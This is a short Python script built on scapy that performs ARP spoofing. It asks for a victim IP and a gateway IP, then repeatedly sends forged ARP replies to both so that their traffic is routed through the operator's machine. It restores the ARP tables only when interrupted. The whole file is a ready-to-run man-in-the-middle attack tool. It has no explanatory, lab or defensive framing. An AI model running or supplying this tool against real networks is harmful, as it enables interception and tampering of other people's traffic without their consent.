#!/usr/bin/env python
import scapy.all as scapy
import time

victim_ip = raw_input(" Enter Victim Ip :")
router_ip = raw_input(" Enter Router/Gateway Ip :")

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered = scapy.srp(arp_request_broadcast, timeout = 1, verbose = False)[0]
    return answered[0][1].hwsrc

def spoof(target_ip, spoof_id):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op = 2, pdst = target_ip, hwdst = target_mac, psrc = spoof_id)
    scapy.send(packet, verbose = False)

def restore(destination_ip, source_ip):
    target_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op = 2, pdst = destination_ip, hwdst = target_mac, psrc = source_ip, hwsrc = source_mac)
    scapy.send(packet, count = 4, verbose = False)

try:
    packet_sent_count = 0
    while True:
        spoof(victim_ip, router_ip)
        spoof(router_ip, victim_ip)
        packet_sent_count = packet_sent_count + 2
        print("\r [+] packet sent "+ str(packet_sent_count))
        time.sleep(2)

except KeyboardInterrupt:
    print("\n [-] CTRL + C pressed now reverting everything back...\n")
    restore(victim_ip,router_ip)
    restore(router_ip,victim_ip)